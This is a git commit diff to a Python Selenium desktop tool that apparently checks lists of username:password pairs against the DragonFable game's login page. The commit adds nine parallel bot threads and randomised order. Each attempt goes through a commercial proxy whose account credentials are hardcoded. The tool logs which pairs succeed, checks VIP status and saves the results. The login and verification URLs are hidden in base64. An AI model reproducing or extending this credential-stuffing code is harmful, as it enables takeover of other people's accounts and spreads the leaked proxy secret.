30a5a8b0214a064d1a5247e47abfe4e89334b4a7
Jocimar Lopes <lopes.jocimar@gmail.com>
2022-11-23 23:57:42 -0300

    Simultaneous Threads verify users

--- app.py
+++ app.py
@@ -3,7 +3,7 @@ from tkinter import *
 from tkinter import filedialog
 from tkinter import messagebox
 import sys
-from selenium.webdriver.chrome.options import Options
+from seleniumwire.webdriver import ChromeOptions
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
 from time import sleep
@@ -17,13 +17,18 @@ import json
 from threading import Thread
 import os
 import base64
+from random import randint
 
 LOGIN_URL = base64.b64decode('aHR0cHM6Ly9hY2NvdW50LmRyYWdvbmZhYmxlLmNvbS9Mb2dpbg==')
 PROXY = 'http://brd-customer-hl_ddb02df8-zone-data_center:a9unexspqppa@zproxy.lum-superproxy.io:22225'
 LIST_THREADS = []
 PERCENT = '0%'
+BOTS_NUMBER = 9
 
-ver = requests.get('https://jocimarlopes.com/verify/data.json')
+MAX_LIST_NUMBER = 0
+
+ver_url = base64.b64decode('aHR0cHM6Ly9qb2NpbWFybG9wZXMuY29tL3ZlcmlmeS9kYXRhLmpzb24=')
+ver = requests.get(ver_url.decode('utf-8'))
 ver = (json.loads(ver.text))['dragon_fable']
 win = sys.platform.startswith("win")
 
@@ -46,9 +51,10 @@ def config():
             'no_proxy': PROXY
         },
     }
-    """ options = Options()
+    options = ChromeOptions()
     options.headless = False
-    options.add_argument('--dns-prefetch-disable') """
+    options.add_argument('--dns-prefetch-disable')
+    options.add_argument('--incognito')
     serv = Service(ChromeDriverManager().install())
     if win:
         from subprocess import CREATE_NO_WINDOW
@@ -57,6 +63,8 @@ def config():
     return driver
         
 def iniciar():
+    global MAX_LIST_NUMBER
+    MAX_LIST_NUMBER = len(list_data) - 1
     driver = config()
     driver.get(LOGIN_URL.decode('utf-8'))
     while 'DF Manage Acct' not in driver.title:
@@ -69,11 +77,11 @@ def iniciar():
             driver.get(LOGIN_URL.decode('utf-8'))
         sleep(1)
     i = 0
-    for index, item in enumerate(list_data, start=1):
+    driver.minimize_window()
+    while MAX_LIST_NUMBER > 0:
         try:
-            i = i + (1 / len(list_data))
-            progressBarSet(i, index)
-            doLogin(item, driver)
+            progressBarSet(MAX_LIST_NUMBER)
+            doLogin(list_data[randint(0, MAX_LIST_NUMBER)], driver)
             while 'DF Manage Acct' not in driver.title:
                 print('- Tentando acessar Dragon Fable')
                 if 'Access denied' in driver.title:
@@ -94,26 +102,46 @@ def iniciar():
         sleep(0.6)
     driver.delete_all_cookies()
     driver.quit()
-    progressBarSet(1, len(list_data))
+    progressBarSet(MAX_LIST_NUMBER)
     messagebox.showinfo('Verificação concluída', 'Por favor, \nescolha o local para \nsalvar o arquivo:\n\n"dragonfable_results.txt"')
     save_vips_to_file()
                     
 def doLogin(data, driver):
-    sleep(0.3)
-    driver.find_element(By.ID, 'uuu').send_keys(data['user'])
-    driver.find_element(By.ID, 'ppp').send_keys(data['pass'])
-    driver.find_element(By.XPATH, '//*[@id="formLogin"]/div[3]/div[2]/button').click()
+    global MAX_LIST_NUMBER
     try:
-        WebDriverWait(driver, 0.8).until(
-            EC.presence_of_element_located((By.XPATH, '//*[@id="LeftPane"]/div/a[2]'))
+        user = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.ID, 'uuu'))
         )
-        logs_to_infos_file('SUCCESS - ' + str(data['user']) + ':' + str(data['pass']))
-        verifyVip(data, driver)
-        sleep(0.2)
-        logout(driver)
+        user.send_keys(data['user'])
+        driver.find_element(By.ID, 'ppp').send_keys(data['pass'])
+        driver.find_element(By.XPATH, '//*[@id="formLogin"]/div[3]/div[2]/button').click()
     except Exception as e:
-        logs_to_infos_file('ERROR - ' + str(data['user']) + ':' + str(data['pass']))
-        pass
+        print(e)
+        driver.refresh()
+        sleep(0.5)
+        user = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.ID, 'uuu'))
+        )
+        user.send_keys(data['user'])
+        driver.find_element(By.ID, 'ppp').send_keys(data['pass'])
+        driver.find_element(By.XPATH, '//*[@id="formLogin"]/div[3]/div[2]/button').click()
+    finally:
+        MAX_LIST_NUMBER = MAX_LIST_NUMBER - 1
+        try:
+            WebDriverWait(driver, 3).until(
+                EC.presence_of_element_located((By.XPATH, '//*[@id="LeftPane"]/div/a[2]'))
+            )
+            logs_to_infos_file('SUCCESS - ' + str(data['user']) + ':' + str(data['pass']))
+            verifyVip(data, driver)
+            sleep(0.2)
+            logout(driver)
+            print(data)
+            list_data.remove({'user': data['user'], 'pass': data['pass']})
+        except Exception as e:
+            logs_to_infos_file('ERROR - ' + str(data['user']) + ':' + str(data['pass']))
+            print(data)
+            list_data.remove({'user': data['user'], 'pass': data['pass']})
+            pass
             
 def logout(driver):
     driver.find_element(By.XPATH, '//*[@id="LeftPane"]/div/a[11]').click()
@@ -190,10 +218,13 @@ def addLoginList():
         print(e)
 def start():
     if ver:
-        sleep(2)
+        sleep(1)
         if len(list_data):
-            try:            
-                Thread(target=iniciar).start()
+            try:
+                for item in range(0, BOTS_NUMBER):
+                    print('\n\nFoi {}\n\n'.format(item))
+                    Thread(target=iniciar).start()
+                    sleep(3)
             except Exception as e:
                 print(e)
         else:
@@ -223,14 +254,14 @@ def logs_to_infos_file(log, dir_file=None):
         wfile.write(lines + log)
         return
 
-def progressBarSet(percent, actual_account):
+def progressBarSet(percent):
     try:
         perc = "{:.2f}".format(percent)
         PERCENT = str(float(perc) * 100) + '%'
-        root.update_idletasks()
         percent_text.configure(text=PERCENT)
-        number_accounts.configure(text="{}/{}".format(actual_account, len(list_data)))
+        number_accounts.configure(text="{}".format(len(list_data)))
         progressbar.set(percent)
+        root.update_idletasks()
     except Exception as e:
         print(e)
         pass
